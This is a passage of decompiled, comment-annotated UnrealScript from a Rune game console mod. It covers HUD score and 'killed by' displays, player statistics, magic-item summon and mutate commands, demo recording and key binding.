            Canvas.DrawColor = MakeColor(byte(RandRange(40.0, 255.0)), 0, byte(RandRange(0.0, 100.0)));
        }
        if (PlayerInfo.Score == 420)
        {
            Canvas.DrawColor = MakeColor(byte(RandRange(0.0, 255.0)), byte(RandRange(0.0, 255.0)), byte(RandRange(0.0, 255.0)));
        }
        Canvas.DrawRect(Texture'UWindow.WhiteTexture', float(PlayerInfo.Score / 7), 5.0);
    }

    Canvas.Style = 1;

    if (FlagXOffset != 0)
    {
        FlagXOffset += 35;
    }

    if (FLT_v6353 > float(PlayerInfo.Score))
    {
        Canvas.SetPos((float(BaseX) * 1.21) + float(FlagXOffset), float(BaseY) * 1.04);
        Canvas.DrawColor = MakeColor(255, 255, 255);
        Canvas.Font = Canvas.MedFont;

        if (PlayerInfo.Score == 666)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.DrawTextClipped("~ 6 6 6 ~");
        }
        else if (PlayerInfo.Score == 420)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.DrawTextClipped("! 4 2 0 !");
        }
        else
        {
            if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v4632)
            {
                Canvas.DrawTextClipped(string(PlayerInfo.Score / 12) $ " hits");
            }
            else
            {
                Canvas.DrawTextClipped(string(PlayerInfo.Score) $ " ");
            }
        }
    }
    else
    {
        Canvas.SetPos((float(BaseX) * 1.21) + float(FlagXOffset), float(BaseY) * 1.04);
        Canvas.DrawColor = MakeColor(255, 255, 255);
        Canvas.Font = Canvas.MedFont;

        if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v4632)
        {
            Canvas.DrawTextClipped(string(int(FLT_v6353) / 12) $ " hits");
        }
        else
        {
            Canvas.DrawTextClipped(string(int(FLT_v6353)) $ " ");
        }
    }
}

// Suggested name: DrawKilledByInfo
function DrawKilledByInfo(Canvas Canvas)
{
    // This function draws the "killed by" information on the screen, showing the killer's name, stats, and awards.

    local int InfoBoxX, InfoBoxY, TempY;
    local PlayerReplicationInfo KillerPRI;
    local int KillerID;
    local Texture SpreeTrophy, HeadsTrophy, ThrowsTrophy;

    SpreeTrophy = Texture'RuneI.TrophySpree';
    HeadsTrophy = Texture'RuneI.TrophyHeads';
    ThrowsTrophy = Texture'coadminz7.Icons.TrophyThrows';

    if (INT_v6708 > 0)
    {
        INT_v6708 -= 5;
    }
    else
    {
        INT_v6708 = 0;
    }

    InfoBoxX = int((Canvas.ClipX - 280.0) + float(INT_v6708));
    InfoBoxY = int(Canvas.ClipY - 150.0);
    KillerPRI = PRI_v6691;
    KillerID = KillerPRI.PlayerID;

    DrawStretchedBox(Canvas, 0.8, InfoBoxX, InfoBoxY, 280 + INT_v6708, 105, MakeColor(byte(BR), byte(BG), byte(BB)));
    Canvas.SetPos(float(InfoBoxX + 8), float(InfoBoxY + 7));
    Canvas.Font = Canvas.BigFont;

    if (int(KillerPRI.Team) == 255)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = GetTeamColor(int(KillerPRI.Team));
    }

    Canvas.DrawTextClipped("Killed by  " $ KillerPRI.PlayerName);
    InfoBoxY += 2;

    if (zPlayerReplicationInfo(KillerPRI).STR_v5375 != "")
    {
        InfoBoxY += 13;
        Canvas.SetPos(float(InfoBoxX + 8), float(InfoBoxY + 7));
        Canvas.DrawColor = MakeColor(255, 255, 255);
        Canvas.DrawTextClipped("// " $ Left(zPlayerReplicationInfo(KillerPRI).STR_v5375, 40));
        InfoBoxY += 2;
    }
    else
    {
        InfoBoxY += 13;
        Canvas.SetPos(float(InfoBoxX + 8), float(InfoBoxY + 7));
        Canvas.DrawColor = MakeColor(255, 255, 255);
        Canvas.DrawTextClipped("No status.");
        InfoBoxY += 2;
    }

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(InfoBoxX + 10), float(InfoBoxY + 30));
    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawTextClipped("Kills: " $ string(int(KillerPRI.Score)));
    Canvas.SetPos(float(InfoBoxX + 10), float(InfoBoxY + 45));
    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawTextClipped("Deaths: " $ string(int(KillerPRI.Deaths)));
    Canvas.SetPos(float(InfoBoxX + 10), float(InfoBoxY + 53));
    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawTextClipped("___________");
    Canvas.SetPos(float(InfoBoxX + 10), float(InfoBoxY + 62));
    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawTextClipped("Versus Kills: " $ string(STCT_v6654[KillerID].Deaths));
    Canvas.SetPos(float(InfoBoxX + 10), float(InfoBoxY + 77));
    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawTextClipped("Versus Deaths: " $ string(STCT_v6654[KillerID].Score));
    Canvas.SetPos(float(InfoBoxX + 90), float(InfoBoxY + 40));
    Canvas.DrawTileClipped(SpreeTrophy, 16.0, 16.0, 0.0, 0.0, float(SpreeTrophy.USize), float(SpreeTrophy.VSize));
    Canvas.DrawTextClipped(string(KillerPRI.MaxSpree), false);
    Canvas.SetPos(float(InfoBoxX + 130), float(InfoBoxY + 40));
    Canvas.DrawTileClipped(HeadsTrophy, 16.0, 16.0, 0.0, 0.0, float(HeadsTrophy.USize), float(HeadsTrophy.VSize));
    Canvas.DrawTextClipped(string(KillerPRI.HeadKills), false);
    Canvas.SetPos(float(InfoBoxX + 170), float(InfoBoxY + 40));
    Canvas.DrawTileClipped(ThrowsTrophy, 16.0, 16.0, 0.0, 0.0, float(ThrowsTrophy.USize), float(ThrowsTrophy.VSize));
    Canvas.DrawTextClipped(string(zPlayerReplicationInfo(KillerPRI).INT_v5354), false);
    Canvas.SetPos(float(InfoBoxX + 210), float(InfoBoxY + 40));
    Canvas.DrawTileClipped(Texture'coadminz7.Icons.JumpIcon', 16.0, 16.0, 0.0, 0.0, float(ThrowsTrophy.USize), float(ThrowsTrophy.VSize));
    Canvas.DrawTextClipped(string(zPlayerReplicationInfo(KillerPRI).INT_v5377), false);
    Canvas.SetPos(float(InfoBoxX + 250), float(InfoBoxY + 40));
    Canvas.DrawColor = MakeColor(255, 105, 180);
    Canvas.DrawTileClipped(Texture'RuneFX2.Wordballoon', 16.0, 16.0, 0.0, 0.0, float(ThrowsTrophy.USize - 2), float(ThrowsTrophy.VSize - 2));
    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawTextClipped(string(zPlayerReplicationInfo(KillerPRI).INT_v5355), false);
}

// Suggested name: TestStatusDisplay
exec function testStatus()
{
    // This function is for testing the status display.
    // It sets the player ID and replication info to the owner's.

    INT_v4864 = Owner.PlayerReplicationInfo.PlayerID;
    INT_v6708 = 280;
    PRI_v6691 = Owner.PlayerReplicationInfo;
}

// Suggested name: OnPlayerKilled
function Killed(PlayerReplicationInfo Killer, PlayerReplicationInfo Victim, name DamageType)
{
    // This function is called when a player is killed.
    // It updates the stats of the killer and the victim.

    if ((Killer != Viewport.Actor.PlayerReplicationInfo) && (Victim != Viewport.Actor.PlayerReplicationInfo))
    {
        return;
    }

    if (Killer != Viewport.Actor.PlayerReplicationInfo)
    {
        STCT_v6654[Killer.PlayerID].PlayerName = Killer.PlayerName;
        STCT_v6654[Killer.PlayerID].Parm_int_0 = Killer.PlayerID;
        STCT_v6654[Killer.PlayerID].Score += 1;
        INT_v4864 = Killer.PlayerID;
        INT_v6708 = 280;
        PRI_v6691 = Killer;
    }

    if (Victim != Viewport.Actor.PlayerReplicationInfo)
    {
        INT_v6651++;
        STCT_v6654[Victim.PlayerID].PlayerName = Victim.PlayerName;
        STCT_v6654[Victim.PlayerID].Parm_int_0 = Victim.PlayerID;
        STCT_v6654[Victim.PlayerID].Deaths += 1;
    }
}

// Suggested name: ShowMagicCommands
exec function magiclist()
{
    // This function displays a list of available magic commands to the player.

    Owner.ClientMessage("======================");
    Owner.ClientMessage("   Magicbook Commands");
    Owner.ClientMessage("======================");
    Owner.ClientMessage("#1   S_MagicBook.S_Weapons");
    Owner.ClientMessage("#2   S_MagicBook.S_MaxHealth");
    Owner.ClientMessage("#3   S_MagicBook.S_MaxRunePower");
    Owner.ClientMessage("#4   S_MagicBook.S_BloodLust");
    Owner.ClientMessage("#5   S_MagicBook.S_Torch");
    Owner.ClientMessage("#6   S_MagicBook.S_PowerUp");
    Owner.ClientMessage("#7   S_MagicBook.S_Resurrect");
    Owner.ClientMessage("#8   S_MagicBook.S_Teleporter");
    Owner.ClientMessage("#9   S_MagicBook.S_EnergyBall");
    Owner.ClientMessage("#10  S_MagicBook.S_AllyBall");
    Owner.ClientMessage("#11  S_MagicBook.S_Avalanche");
    Owner.ClientMessage("#12  S_MagicBook.S_BlastRadius");
    Owner.ClientMessage("#13  S_MagicBook.S_EarthAttack");
    Owner.ClientMessage("#14  S_MagicBook.S_FireBall");
    Owner.ClientMessage("#15  S_MagicBook.S_FireRadius");
    Owner.ClientMessage("#16  S_MagicBook.S_FreezeBall");
    Owner.ClientMessage("#17  S_MagicBook.S_Lightning");
    Owner.ClientMessage("#18  S_MagicBook.S_MagicShield");
    Owner.ClientMessage("#19  S_MagicBook.S_Revenge");
    Owner.ClientMessage("#20  S_MagicBook.S_SonicBlast");
    Owner.ClientMessage("#21  S_MagicBook.S_Spirit");
    Owner.ClientMessage("#22  S_MagicBook.S_StoneBall");
    Owner.ClientMessage("#23  S_MagicBook.S_SuperBall");
    Owner.ClientMessage("#24  S_MagicBook.S_UnlimitedThrow");
    Owner.ClientMessage("#25  S_MagicBook.S_VampireBall");
    Owner.ClientMessage("#26  S_MagicBook.S_DrumMusic");
    Owner.ClientMessage("#27  S_MagicBook.S_GongMusic");
    Owner.ClientMessage("#28  S_MagicBook.S_HornMusic");
    Owner.ClientMessage("#29  S_MagicBook.S_BloodLustBall");
    Owner.ClientMessage("#30  S_MagicBook.S_HealthBall");
    Owner.ClientMessage("#31  S_MagicBook.S_RunePowerBall");
    Owner.ClientMessage("#32  S_MagicBook.S_Amphibious");
    Owner.ClientMessage("#33  S_MagicBook.S_Fly");
    Owner.ClientMessage("#34  S_MagicBook.S_Ghost");
    Owner.ClientMessage("#35  S_MagicBook.S_God");
    Owner.ClientMessage("#36  S_MagicBook.S_Invisible");
}

// Suggested name: SummonMagicItem
exec function magic(int MagicID)
{
    // This function summons a magic item based on the provided MagicID.

    switch (MagicID)
    {
        case 1: ConsoleCommand("summon S_MagicBook.S_Weapons"); break;
        case 2: ConsoleCommand("summon S_MagicBook.S_MaxHealth"); break;
        case 3: ConsoleCommand("summon S_MagicBook.S_MaxRunePower"); break;
        case 4: ConsoleCommand("summon S_MagicBook.S_BloodLust"); break;
        case 5: ConsoleCommand("summon S_MagicBook.S_Torch"); break;
        case 6: ConsoleCommand("summon S_MagicBook.S_PowerUp"); break;
        case 7: ConsoleCommand("summon S_MagicBook.S_Resurrect"); break;
        case 8: ConsoleCommand("summon S_MagicBook.S_Teleporter"); break;
        case 9: ConsoleCommand("summon S_MagicBook.S_EnergyBall"); break;
        case 10: ConsoleCommand("summon S_MagicBook.S_AllyBall"); break;
        case 11: ConsoleCommand("summon S_MagicBook.S_Avalanche"); break;
        case 12: ConsoleCommand("summon S_MagicBook.S_BlastRadius"); break;
        case 13: ConsoleCommand("summon S_MagicBook.S_EarthAttack"); break;
        case 14: ConsoleCommand("summon S_MagicBook.S_FireBall"); break;
        case 15: ConsoleCommand("summon S_MagicBook.S_FireRadius"); break;
        case 16: ConsoleCommand("summon S_MagicBook.S_FreezeBall"); break;
        case 17: ConsoleCommand("summon S_MagicBook.S_Lightning"); break;
        case 18: ConsoleCommand("summon S_MagicBook.S_MagicShield"); break;
        case 19: ConsoleCommand("summon S_MagicBook.S_Revenge"); break;
        case 20: ConsoleCommand("summon S_MagicBook.S_SonicBlast"); break;
        case 21: ConsoleCommand("summon S_MagicBook.S_Spirit"); break;
        case 22: ConsoleCommand("summon S_MagicBook.S_StoneBall"); break;
        case 23: ConsoleCommand("summon S_MagicBook.S_SuperBall"); break;
        case 24: ConsoleCommand("summon S_MagicBook.S_UnlimitedThrow"); break;
        case 25: ConsoleCommand("summon S_MagicBook.S_VampireBall"); break;
        case 26: ConsoleCommand("summon S_MagicBook.S_DrumMusic"); break;
        case 27: ConsoleCommand("summon S_MagicBook.S_GongMusic"); break;
        case 28: ConsoleCommand("summon S_MagicBook.S_HornMusic"); break;
        case 29: ConsoleCommand("summon S_MagicBook.S_BloodLustBall"); break;
        case 30: ConsoleCommand("summon S_MagicBook.S_HealthBall"); break;
        case 31: ConsoleCommand("summon S_MagicBook.S_RunePowerBall"); break;
        case 32: ConsoleCommand("summon S_MagicBook.S_Amphibious"); break;
        case 33: ConsoleCommand("summon S_MagicBook.S_Fly"); break;
        case 34: ConsoleCommand("summon S_MagicBook.S_Ghost"); break;
        case 35: ConsoleCommand("summon S_MagicBook.S_God"); break;
        case 36: ConsoleCommand("summon S_MagicBook.S_Invisible"); break;
    }
}

// Suggested name: MutateMagicItem
exec function mutatemagic(int MagicID)
{
    // This function mutates a magic item based on the provided MagicID.

    switch (MagicID)
    {
        case 1: ConsoleCommand("mutate Weapons"); break;
        case 2: ConsoleCommand("mutate MaxHealth"); break;
        case 3: ConsoleCommand("mutate MaxRunePower"); break;
        case 4: ConsoleCommand("mutate BloodLust"); break;
        case 5: ConsoleCommand("mutate Torch"); break;
        case 6: ConsoleCommand("mutate PowerUp"); break;
        case 7: ConsoleCommand("mutate Resurrect"); break;
        case 8: ConsoleCommand("mutate Teleporter"); break;
        case 9: ConsoleCommand("mutate EnergyBall"); break;
        case 10: ConsoleCommand("mutate AllyBall"); break;
        case 11: ConsoleCommand("mutate Avalanche"); break;
        case 12: ConsoleCommand("mutate BlastRadius"); break;
        case 13: ConsoleCommand("mutate EarthAttack"); break;
        case 14: ConsoleCommand("mutate FireBall"); break;
        case 15: ConsoleCommand("mutate FireRadius"); break;
        case 16: ConsoleCommand("mutate FreezeBall"); break;
        case 17: ConsoleCommand("mutate Lightning"); break;
        case 18: ConsoleCommand("mutate MagicShield"); break;
        case 19: ConsoleCommand("mutate Revenge"); break;
        case 20: ConsoleCommand("mutate SonicBlast"); break;
        case 21: ConsoleCommand("mutate Spirit"); break;
        case 22: ConsoleCommand("mutate StoneBall"); break;
        case 23: ConsoleCommand("mutate SuperBall"); break;
        case 24: ConsoleCommand("mutate UnlimitedThrow"); break;
        case 25: ConsoleCommand("mutate VampireBall"); break;
        case 26: ConsoleCommand("mutate DrumMusic"); break;
        case 27: ConsoleCommand("mutate GongMusic"); break;
        case 28: ConsoleCommand("mutate HornMusic"); break;
        case 29: ConsoleCommand("mutate BloodLustBall"); break;
        case 30: ConsoleCommand("mutate HealthBall"); break;
        case 31: ConsoleCommand("mutate RunePowerBall"); break;
        case 32: ConsoleCommand("mutate Amphibious"); break;
        case 33: ConsoleCommand("mutate Fly"); break;
        case 34: ConsoleCommand("mutate Ghost"); break;
        case 35: ConsoleCommand("mutate God"); break;
        case 36: ConsoleCommand("mutate Invisible"); break;
    }
}

// Suggested name: GetGameType
exec function getgame()
{
    // This function checks if the current game is a team game and prints the result to the console.

    if (Owner.Level.Game.IsA('TeamGame'))
    {
        Viewport.Actor.ClientMessage("teamgame");
    }
    else
    {
        Viewport.Actor.ClientMessage("nope");
    }
}

// Suggested name: OpenOldConsole
exec function oldConsole()
{
    // This function switches the state to 'Typing', likely to open the old console.
    GotoState('Typing');
}

// Suggested name: ForceRespawn
exec function fRespawn(int PlayerID)
{
    // This function is currently empty and may be a placeholder for a force respawn feature.
    return;
}

// Suggested name: GeneratePlayerKey
function GeneratePlayerKey()
{
    // This function generates a player key.
    // It uses the computer name and a random number to generate a key,
    // and then it seems to call a static function from another class to process it.

    local string BaseKey, ProcessedKey;

    BaseKey = ("z" $ STR_v6707) $ string(Rand(99999));
    ProcessedKey = Class'coadminz7.CoralCastle4'.static.Md5Hash(BaseKey);
    PlayerKey = ProcessedKey;
}

// Suggested name: ShowChangelog
exec function changelog()
{
    // This function displays a link to the changelog.

    Owner.ClientMessage("http://therune.boards.net/thread/32/changelog");
    Owner.ClientMessage("Open console to click the link.");
}

// Suggested name: SetConsoleKey
function SetConsoleKey(int Key)
{
    // This function sets the console key.

    ConsoleKey = byte(Key);
    zConsoleKey = byte(Key);
    ConsoleCommand("set windowconsole consolekey " $ string(Key));
    SaveConfigAndRefresh();
}

// Suggested name: SendClientMessage
function SendClientMessage(string Message)
{
    // This function is a simple wrapper for Owner.ClientMessage.
    Owner.ClientMessage(Message);
}

// Suggested name: LogSeparator
exec function klog()
{
    // This function logs a separator to the internal log.
    LogInternal("==================");
}

// Suggested name: ContainsString
function bool ContainsString(string SearchIn, string SearchFor)
{
    // This function checks if a string contains another string, case-insensitively.
    return InStr(Caps(SearchIn), Caps(SearchFor)) > -1;
}

// Suggested name: FormatTime
function string FormatTime(bool bIdleTime)
{
    // This function formats a time in minutes into a string with days, hours, and minutes.
    // The boolean parameter determines whether to use the total play time or the idle time.

    local int Days, Hours, Minutes, TotalMinutes;
    local string TimeString;

    if (!bIdleTime)
    {
        TotalMinutes = zstatMinutesPlayed - (zstatIdleTime / 60);
    }
    else
    {
        TotalMinutes = zstatIdleTime / 60;
    }

    Days = TotalMinutes / (24 * 60);
    Hours = int(float(TotalMinutes) % float(24 * 60)) / 60;
    Minutes = int(float(int(float(TotalMinutes) % float(24 * 60))) % float(60));

    if (Days > 0)
    {
        if (Days == 1)
        {
            TimeString = "1 day";
        }
        else
        {
            TimeString = string(Days) $ " days";
        }
    }

    if (Hours > 0)
    {
        if (TimeString != "")
        {
            TimeString = TimeString $ ", ";
        }
        if (Hours == 1)
        {
            TimeString = TimeString $ "1 hour";
        }
        else
        {
            TimeString = (TimeString $ string(Hours)) $ " hours";
        }
    }

    if (Minutes > 0)
    {
        if (TimeString != "")
        {
            TimeString = TimeString $ ", ";
        }
        if (Minutes == 1)
        {
            TimeString = TimeString $ "1 minute";
        }
        else
        {
            TimeString = (TimeString $ string(Minutes)) $ " minutes";
        }
    }

    if (TimeString == "")
    {
        TimeString = "No records yet.";
    }

    return TimeString;
}

// Suggested name: ShowPlayerStats
exec function stats()
{
    // This function displays the player's statistics.

    local int i;

    Owner.ClientMessage("~ Open console to view your statistics ~");
    AddString("===============================================");
    AddString("     P L A Y E R   S T A T I S T I C S");
    AddString("        Since   " $ zStatDate);
    AddString("===============================================");
    AddString("   WEBSITE:  https://playrune.com");
    AddString("===============================================");
    AddString("Games played: " $ string(zstatGamesPlayed));
    AddString("Play time: " $ (FormatTime(false)));
    AddString("Idle time: " $ (FormatTime(true)));
    AddString("Total Kills: " $ string(zstatKills));
    AddString("Total Deaths: " $ string(zstatDeaths));
    AddString("Total K/D ratio: " $ (CalculateKDRatio(float(zstatKills), float(zstatDeaths))));
    AddString("Total Throwkills: " $ string(zstatThrowKills));
    AddString("Total Chatkills: " $ string(zstatChatKills));
    AddString("Total Jumpkills: " $ string(zstatJumpKills));
    AddString("Total Headshots: " $ string(zstatHeadKills));
    AddString("Biggest killing spree: " $ string(zstatBiggestSpree));

    if (myStatus != "")
    {
        AddString(("Your status: '" $ Left(myStatus, 40)) $ "'");
    }
    else
    {
        AddString("You didn't set a status yet, use 'status Text' and those you kill will see your status if you kill them.");
    }

    AddString("===============================================");
    AddString("Total Arena Kills: " $ string(zstatArenaKills));
    AddString("Total Arena Deaths: " $ string(zstatArenaDeaths));
    AddString("===============================================");
    AddString("Stats for the current map:");
    AddString("===============================================");

    for (i = 0; i < 40; i++)
    {
        if (STCT_v6654[i].PlayerName != "")
        {
            AddString((((STCT_v6654[i].PlayerName $ " ~ Kills: ") $ string(STCT_v6654[i].Deaths)) $ " , Deaths: ") $ string(STCT_v6654[i].Score));
        }
    }

    AddString("You can check your stats anytime with 'stats'");
    AddString("To reset your stats use 'resetstats'");
    AddString("If you leave before the match is over your stats won't be updated");
    AddString("===============================================");
}

// Suggested name: ResetPlayerStats
exec function resetStats()
{
    // This function resets all of the player's statistics to their default values.

    Owner.ClientMessage("~ Your statistics have been resetted ~");
    zstatGamesPlayed = 0;
    zstatMinutesPlayed = 0;
    zstatArenaKills = 0;
    zstatArenaDeaths = 0;
    zstatKills = 0;
    zstatDeaths = 0;
    zstatThrowKills = 0;
    zStatDate = "";
    zstatChatKills = 0;
    zstatJumpKills = 0;
    zstatHeadKills = 0;
    zstatBiggestSpree = 0;
}

// Suggested name: StartNewDemoRecording
exec function StartNewDemo()
{
    // This function starts a new demo recording with an incremented number at the end of the filename.

    DemoRecordingIndex++;
    DemoRec(Left(DemoRecordingName, DemoRecordingNameLength) $ string(DemoRecordingIndex));
}

// Suggested name: StartDemoRecording
function StartDemoRecording(string DemoName)
{
    // This function starts a new demo recording.
    // It checks if a demo with the same name already exists.

    local string ExecResult, StopResult;

    ExecResult = Owner.ConsoleCommand(("exec " $ DemoName) $ ".dem");
    StopResult = Owner.ConsoleCommand("stopdemo");

    if (ExecResult == "")
    {
        Owner.ClientMessage(("There is already a demorecording named " $ DemoName) $ "  - please choose a different name.", 'CAZ');
        return;
    }
    else
    {
        if (ZRunePlayer(Owner) != none)
        {
            ExecResult = ZRunePlayer(Owner).myHUD.ConsoleCommand("demorec " $ DemoName);
            if (Left(DemoRecordingName, DemoRecordingNameLength) != Left(DemoName, DemoRecordingNameLength))
            {
                DemoRecordingName = DemoName;
                DemoRecordingNameLength = Len(DemoRecordingName);
            }
            if (DemoRecordingName == "")
            {
                DemoRecordingName = DemoName;
                DemoRecordingNameLength = Len(DemoRecordingName);
            }
        }
        else
        {
            ExecResult = TCCSpectator(Owner).myHUD.ConsoleCommand("demorec " $ DemoName);
            if (Left(DemoRecordingName, DemoRecordingNameLength) != Left(DemoName, DemoRecordingNameLength))
            {
                DemoRecordingName = DemoName;
                DemoRecordingNameLength = Len(DemoRecordingName);
            }
            if (DemoRecordingName == "")
            {
                DemoRecordingName = DemoName;
                DemoRecordingNameLength = Len(DemoRecordingName);
            }
        }
    }
}

// Suggested name: RecordDemo
exec function DemoRec(string DemoName)
{
    // This function starts a new demo recording.
    // It checks if a demo with the same name already exists.

    local string ExecResult;

    ExecResult = Owner.ConsoleCommand(("exec " $ DemoName) $ ".dem");
    ConsoleCommand("stopdemo");

    if (ExecResult == "")
    {
        Owner.ClientMessage(("There is already a demorecording named " $ DemoName) $ "  - please choose a different name.", 'CAZ');
        return;
    }
    else
    {
        if (ZRunePlayer(Owner) != none)
        {
            ExecResult = ZRunePlayer(Owner).myHUD.ConsoleCommand("demorec " $ DemoName);
            if (ExecResult != "")
            {
                Owner.ClientMessage(ExecResult, 'CAZ');
            }
            if (Left(DemoRecordingName, DemoRecordingNameLength) != Left(DemoName, DemoRecordingNameLength))
            {
                DemoRecordingName = DemoName;
                DemoRecordingNameLength = Len(DemoRecordingName);
            }
            if (DemoRecordingName == "")
            {
                DemoRecordingName = DemoName;
                DemoRecordingNameLength = Len(DemoRecordingName);
            }
        }
        else
        {
            ExecResult = TCCSpectator(Owner).myHUD.ConsoleCommand("demorec " $ DemoName);
            if (ExecResult != "")
            {
                Owner.ClientMessage(ExecResult, 'CAZ');
            }
            if (Left(DemoRecordingName, DemoRecordingNameLength) != Left(DemoName, DemoRecordingNameLength))
            {
                DemoRecordingName = DemoName;
                DemoRecordingNameLength = Len(DemoRecordingName);
            }
            if (DemoRecordingName == "")
            {
                DemoRecordingName = DemoName;
                DemoRecordingNameLength = Len(DemoRecordingName);
            }
        }
    }
}

// Suggested name: PlayDemo
exec function DemoPlay(string DemoName)
{
    // This function plays a demo recording.

    local string ExecResult;

    if (ZRunePlayer(Owner) != none)
    {
        ZRunePlayer(Owner).SetPendingCommand("demoplay", false);
        ExecResult = ZRunePlayer(Owner).myHUD.ConsoleCommand("demoplay " $ DemoName);
        if (ExecResult != "")
        {
            Owner.ClientMessage(ExecResult);
        }
    }
    else
    {
        ExecResult = TCCSpectator(Owner).myHUD.ConsoleCommand("demoplay " $ DemoName);
        if (ExecResult != "")
        {
            Owner.ClientMessage(ExecResult);
        }
    }
}

// Suggested name: LogSelectionInfo
exec function getselinf()
{
    // This function logs the contents of the eqI_vxv_6587 array to the internal log.

    local int i;

    for (i = 0; i < 64; i++)
    {
        LogInternal("#a##a#a#a " $ eqI_vxv_6587[i]);
    }
}

// Suggested name: SetPlayerTeam
exec function Team(string TeamName)
{
    // This function sets the player's team based on a string input (color name or number).

    local int TeamIndex;

    switch (Caps(TeamName))
    {
        case "RED":
        case "0":
            TeamIndex = 0;
            break;
        case "BLUE":
        case "1":
            TeamIndex = 1;
            break;
        case "GREEN":
        case "2":
            TeamIndex = 2;
            break;
        case "GOLD":
        case "YELLOW":
        case "3":
            TeamIndex = 3;
            break;
        case "PINK":
        case "PURPLE":
        case "4":
            TeamIndex = 4;
            break;
        default:
            Owner.ClientMessage("Incorrect Team , try RED/BLUE/GREEN/GOLD/PINK or 0/1/2/3/4");
            return;
    }

    ZRunePlayer(Owner).Team(TeamIndex);
}

// Suggested name: SetMenuKey
exec function menukey(string KeyName)
{
    // This function sets the key used to open the menu.

    local int i;

    if (KeyName == "~")
    {
        KeyName = "tilde";
    }

    for (i = 0; i < 255; i++)
    {
        if (Owner.ConsoleCommand("keyname " $ string(i)) ~= KeyName)
        {
            cMenuKey = i;
            cMenuKeyName = Caps(KeyName);
            Owner.ClientMessage("Your menukey has been changed to " $ Caps(KeyName));
            SaveConfigAndRefresh();
            return;
        }
    }

    Owner.ClientMessage("Unknown key.");
}

// Suggested name: SetSmartKey
exec function smartkey(string KeyName)
{
    // This function sets the key used for smart chat.

    local int i;

    if (KeyName == "~")
    {
        KeyName = "tilde";
    }

    for (i = 0; i < 255; i++)
    {
        if (Owner.ConsoleCommand("keyname " $ string(i)) ~= KeyName)
        {
            cSmartKey = i;
            cSmartKeyName = Caps(KeyName);
            Owner.ClientMessage("Your smartchat key has been changed to " $ Caps(KeyName));
            SaveConfigAndRefresh();
            return;
        }
    }

    Owner.ClientMessage("Unknown key.");
}

// Suggested name: SummonItem
exec function Summon(string ItemName)
{
    // This function summons an item by its name, but only if the player is not a spectator.

    if (!spec)
    {
        B_v6590 = true;
        ZRunePlayer(Owner).Summon(ItemName);
    }
}

// Suggested name: FindActorByStringName
function Actor FindActorByStringName(string ActorStringName)
{
    // This function searches for an actor by its string representation.

    local Actor CurrentActor, FoundActor;

    foreach Owner.Level.AllActors(Class'Engine.Actor', CurrentActor)
    {
        if (string(CurrentActor) == ActorStringName)
        {
            FoundActor = CurrentActor;
            break; // Found the actor, exit loop
        }
    }

    return FoundActor;
}

// Suggested name: CleanUpActorList
function CleanUpActorList()
{
    // This function iterates through a list of actor names (eqI_vxv_6587)
    // and clears entries that no longer correspond to existing actors in the level.

    local Actor CurrentActor;
    local int i;
    local bool bActorExists;

    if (!spec)
    {
        for (i = 0; i < 64; i++)
        {
            bActorExists = false;
            foreach Owner.Level.AllActors(Class'Engine.Actor', CurrentActor)
            {
                if (string(CurrentActor) == eqI_vxv_6587[i])
                {
                    bActorExists = true;
                    break;
                }
            }

            if (!bActorExists)
            {
                eqI_vxv_6587[i] = "";
            }
        }
    }
}

// Suggested name: HandleActorSummoning
function HandleActorSummoning(Actor SummonedActor, bool bJustSetFlag)
{
    // This function handles the summoning of an actor.
    // If bJustSetFlag is true, it only sets a flag; otherwise, it calls eqstar_vxv_1342 to process the summoned actor.

    if (bJustSetFlag)
    {
        B_v6590 = true;
    }
    else
    {
        if (SummonedActor != none)
        {
            AddSummonedActorToList(SummonedActor);
        }
    }
    B_v6590 = false;
}

// Suggested name: AddSummonedActorToList
function AddSummonedActorToList(Actor SummonedActor)
{
    // This function adds a summoned actor to a list (eqI_vxv_6587).
    // If the list is full, it shifts existing elements and adds the new actor at the end.

    local int i;

    CleanUpActorList(); // Ensure the list is clean before adding

    for (i = 0; i < 64; i++)
    {
        if (eqI_vxv_6587[i] == "")
        {
            eqI_vxv_6587[i] = string(SummonedActor);
            if (bAutoSelect)
            {
                selectedObjectID = i;
                A_v6593 = SummonedActor;
            }
            return;
        }
    }

    // If the list is full, shift elements and add to the end
    for (i = 0; i < (64 - 1); i++)
    {
        eqplus_vxv_1344(eqI_vxv_6587[i], eqI_vxv_6587[i + 1]);
    }
    eqI_vxv_6587[64 - 1] = string(SummonedActor);

    if (bAutoSelect)
    {
        selectedObjectID = 63;
        A_v6593 = SummonedActor;
    }
}

// Suggested name: AssignString
function eqplus_vxv_1344(out string Destination, string Source)
{
    // This function assigns the value of the Source string to the Destination string.
    // It is likely a helper function for shifting elements in an array.

    Destination = Source;
}

// Suggested name: ToggleDevSettings
exec function ToggleDevSettings()
{
    // This function cycles through development settings modes (0, 1, 2).
    // The color assignment seems to be a placeholder or a bug, as bool(1.3) will always be true, resulting in byte(true) which is 1.

    local Color PlaceholderColor; // This variable seems to be unused or a placeholder.

    // This line likely has unintended behavior due to casting float to bool then to byte.
    // bool(1.3) evaluates to true, and byte(true) evaluates to 1.
    PlaceholderColor = MakeColor(byte(bool(1.3)), byte(bool(1.3)), byte(bool(1.3)), byte(bool(1.3)));

    if (devSettings < 2)
    {
        devSettings++;
    }
    else
    {
        devSettings = 0;
    }

    Viewport.Actor.ClientMessage("toggled dev settings");
    SaveConfigAndRefresh();
}

// Suggested name: ToggleConsoleMenu
exec function togglemenu()
{
    // This function toggles the visibility of the console menu.

    bCMenu = !bCMenu;
    Viewport.Actor.ClientMessage("toggled menu");
}

// Suggested name: DrawCenteredText
function DrawCenteredText(Canvas TargetCanvas, string TextToDraw)
{
    // This function draws text on the canvas, centered horizontally.

    local float TextWidth, TextHeight;

    TargetCanvas.bCenter = false;
    TargetCanvas.Font = Font'CAZResources.Palatino35';
